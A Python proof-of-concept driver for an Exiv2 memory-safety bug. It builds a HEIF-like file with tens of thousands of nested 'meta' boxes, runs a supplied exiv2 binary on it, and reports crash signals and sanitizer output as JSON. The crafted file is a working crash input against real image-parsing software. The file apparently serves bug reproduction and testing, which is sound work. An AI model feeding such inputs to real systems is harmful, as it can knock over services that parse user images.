#!/usr/bin/env python3
import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


MAX_CAPTURE = 20000
DEFAULT_TIMEOUT = 10.0
NESTED_META_BOXES = 39000


def truncate_text(data, limit=MAX_CAPTURE):
    text = data.decode("utf-8", "replace")
    if len(text) > limit:
        return text[:limit] + "...[truncated]"
    return text


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    signum = -returncode
    try:
        return signal.Signals(signum).name
    except ValueError:
        return "SIG%d" % signum


def make_nested_bmff(path, depth=NESTED_META_BOXES):
    # HEIF-like BMFF file: ftyp followed by deeply nested full 'meta' boxes.
    # Each meta box is a FullBox, so it carries 4 version/flags bytes.
    with open(path, "wb") as f:
        f.write(struct.pack(">I4s", 20, b"ftyp"))
        f.write(b"mif1\x00\x00\x00\x00mif1")
        for remaining in range(depth, 0, -1):
            f.write(struct.pack(">I4s", remaining * 12, b"meta"))
            f.write(b"\x00\x00\x00\x00")


def sanitizer_marker(stdout_text, stderr_text):
    combined = stderr_text + "\n" + stdout_text
    markers = [
        "AddressSanitizer",
        "UndefinedBehaviorSanitizer",
        "MemorySanitizer",
        "LeakSanitizer",
        "heap-buffer-overflow",
        "stack-buffer-overflow",
        "global-buffer-overflow",
        "stack-overflow",
        "use-after-free",
        "double-free",
        "SEGV on unknown address",
    ]
    for marker in markers:
        if marker in combined:
            return marker
    return None


def build_result(binary, command, returncode, timed_out, runtime_ms, stdout_text, stderr_text, error):
    sig = signal_name(returncode)
    marker = sanitizer_marker(stdout_text, stderr_text)

    if sig is not None:
        observable = {"kind": "crash_trace", "value": sig, "path": None}
    elif marker is not None:
        observable = {"kind": "stderr", "value": marker, "path": None}
    else:
        evidence = (stderr_text or stdout_text or "no crash").strip()
        if len(evidence) > 2000:
            evidence = evidence[:2000] + "...[truncated]"
        observable = {"kind": "combined_output", "value": evidence, "path": None}

    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": sig,
        "timed_out": timed_out,
        "runtime_ms": int(runtime_ms),
        "stdout": stdout_text,
        "stderr": stderr_text,
        "observable": observable,
        "error": error,
    }


def emit(result, json_out):
    text = json.dumps(result, sort_keys=False, separators=(",", ":"))
    print(text)
    if json_out:
        with open(json_out, "w", encoding="utf-8") as f:
            f.write(text)
            f.write("\n")


def main(argv=None):
    parser = argparse.ArgumentParser(description="Exiv2 memory-safety PoC driver")
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    args = parser.parse_args(argv)

    command = []
    returncode = None
    timed_out = False
    stdout_text = ""
    stderr_text = ""
    runtime_ms = 0
    error = None

    if not os.path.isfile(args.binary):
        error = "missing binary"
        result = build_result(args.binary, command, returncode, timed_out, runtime_ms, stdout_text, stderr_text, error)
        emit(result, args.json_out)
        return 0
    if not os.access(args.binary, os.X_OK):
        error = "binary is not executable"
        result = build_result(args.binary, command, returncode, timed_out, runtime_ms, stdout_text, stderr_text, error)
        emit(result, args.json_out)
        return 0
    if args.timeout <= 0:
        error = "timeout must be positive"
        result = build_result(args.binary, command, returncode, timed_out, runtime_ms, stdout_text, stderr_text, error)
        emit(result, args.json_out)
        return 0

    with tempfile.TemporaryDirectory(prefix="exiv2-poc-") as tmpdir:
        payload = os.path.join(tmpdir, "nested-meta.heic")
        make_nested_bmff(payload)
        command = [args.binary, "-pS", payload]

        start = time.monotonic()
        try:
            proc = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=args.timeout,
            )
            runtime_ms = (time.monotonic() - start) * 1000
            returncode = proc.returncode
            stdout_text = truncate_text(proc.stdout)
            stderr_text = truncate_text(proc.stderr)
        except subprocess.TimeoutExpired as exc:
            runtime_ms = (time.monotonic() - start) * 1000
            timed_out = True
            returncode = None
            stdout_text = truncate_text(exc.stdout or b"")
            stderr_text = truncate_text(exc.stderr or b"")
        except OSError as exc:
            runtime_ms = (time.monotonic() - start) * 1000
            error = "failed to execute target: %s" % exc

    result = build_result(args.binary, command, returncode, timed_out, runtime_ms, stdout_text, stderr_text, error)
    emit(result, args.json_out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
